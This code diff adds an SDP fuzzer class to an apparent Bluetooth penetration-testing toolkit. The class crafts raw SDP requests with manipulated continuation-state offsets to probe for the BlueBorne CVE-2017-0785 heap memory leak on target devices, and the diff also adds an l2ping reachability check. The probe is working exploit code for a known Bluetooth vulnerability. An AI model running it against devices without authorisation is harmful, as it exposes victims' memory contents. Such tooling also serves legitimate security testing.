@@ -14,7 +14,7 @@ from bt_tap.utils.output import info, success, error, warning
 from bt_tap.utils.bt_helpers import run_cmd, check_tool
 
 # Bluetooth socket constants (from <bluetooth/bluetooth.h>)
-AF_BLUETOOTH = 31
+AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
 BTPROTO_L2CAP = 0
 BTPROTO_RFCOMM = 3
 
@@ -222,6 +222,132 @@ class RFCOMMFuzzer:
 # ---------------------------------------------------------------------------
 # External tool wrapper
 # ---------------------------------------------------------------------------
+
+class SDPFuzzer:
+    """Fuzz the SDP layer — targets BlueBorne CVE-2017-0785 continuation state attack."""
+
+    def __init__(self, address: str):
+        self.address = address
+
+    def probe_continuation_state(self, psm: int = 1) -> dict:
+        """Send SDP requests with crafted continuation state values.
+
+        Tests for CVE-2017-0785: Android SDP server used continuation state
+        as a raw memory offset without bounds checking. A manipulated
+        continuation state pointing beyond the response buffer causes the
+        server to leak heap memory in the SDP response.
+
+        This probe sends legitimate SDP requests, then replays with
+        modified continuation state to detect info leak behavior.
+        """
+        import struct
+
+        info(f"Probing SDP continuation state on {self.address} PSM {psm}")
+        sock = None
+        results = {"probes_sent": 0, "responses": [], "leak_suspected": False}
+
+        try:
+            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
+            sock.settimeout(5.0)
+            sock.connect((self.address, psm))
+
+            # SDP ServiceSearchAttributeRequest for all services
+            # Transaction ID=0x0001, MaxByteCount=0x0040
+            sdp_req = bytes([
+                0x06,                    # SDP_ServiceSearchAttributeRequest
+                0x00, 0x01,              # Transaction ID
+                0x00, 0x11,              # Parameter length
+                # ServiceSearchPattern: UUID L2CAP (0x0100)
+                0x35, 0x03, 0x19, 0x01, 0x00,
+                0x00, 0x40,              # MaximumAttributeByteCount
+                # AttributeIDList: all attributes (0x0000-0xFFFF)
+                0x35, 0x05, 0x0a, 0x00, 0x00, 0xff, 0xff,
+                0x00,                    # ContinuationState length = 0
+            ])
+
+            sock.send(sdp_req)
+            results["probes_sent"] += 1
+
+            try:
+                resp = sock.recv(4096)
+                if resp and len(resp) > 5:
+                    results["responses"].append({
+                        "type": "initial",
+                        "length": len(resp),
+                        "hex_preview": resp[:32].hex(),
+                    })
+
+                    # Check if response has continuation state
+                    # Last bytes: continuation state length + data
+                    cont_len = resp[-1] if resp else 0
+                    if cont_len > 0 and len(resp) > cont_len + 1:
+                        cont_state = resp[-(cont_len + 1):-1]
+                        info(f"Got continuation state: {cont_state.hex()} ({cont_len} bytes)")
+
+                        # Craft modified continuation state with offset manipulation
+                        test_offsets = [
+                            cont_state,  # Original (baseline)
+                            b"\x00" * cont_len,  # Zero offset
+                            b"\xff" * cont_len,  # Max offset
+                        ]
+
+                        for i, test_cont in enumerate(test_offsets):
+                            modified_req = sdp_req[:-1] + bytes([len(test_cont)]) + test_cont
+                            # Update parameter length
+                            new_plen = len(modified_req) - 5
+                            modified_req = modified_req[:3] + struct.pack(">H", new_plen) + modified_req[5:]
+
+                            try:
+                                sock.send(modified_req)
+                                results["probes_sent"] += 1
+                                probe_resp = sock.recv(4096)
+                                resp_info = {
+                                    "type": f"cont_probe_{i}",
+                                    "cont_state": test_cont.hex(),
+                                    "length": len(probe_resp) if probe_resp else 0,
+                                }
+                                if probe_resp:
+                                    resp_info["hex_preview"] = probe_resp[:32].hex()
+                                results["responses"].append(resp_info)
+
+                                # If response with max offset is different size than original,
+                                # may indicate memory read at arbitrary offset
+                                if i == 2 and probe_resp and len(probe_resp) != len(resp):
+                                    results["leak_suspected"] = True
+                                    warning("Response size varies with continuation offset — possible info leak!")
+                            except (socket.timeout, OSError):
+                                results["responses"].append({
+                                    "type": f"cont_probe_{i}",
+                                    "cont_state": test_cont.hex(),
+                                    "error": "timeout/refused",
+                                })
+                    else:
+                        info("No continuation state in response (response fit in single fragment)")
+            except socket.timeout:
+                info("No SDP response (timeout)")
+
+            success(f"SDP continuation probe: {results['probes_sent']} probes sent")
+            return results
+
+        except OSError as exc:
+            error(f"SDP probe connect error: {exc}")
+            return results
+        finally:
+            if sock:
+                try:
+                    sock.close()
+                except OSError:
+                    pass
+
+
+def _check_target_alive(address: str) -> bool:
+    """Quick reachability check via l2ping before fuzzing."""
+    result = run_cmd(["l2ping", "-c", "1", "-t", "3", address], timeout=8)
+    if result.returncode != 0:
+        warning(f"Target {address} not reachable via L2CAP ping — may be out of range")
+        return False
+    return True
+
 
 def bss_wrapper(target: str, mode: str = "l2cap") -> bool:
     """Run Bluetooth Stack Smasher (bss) against a target.
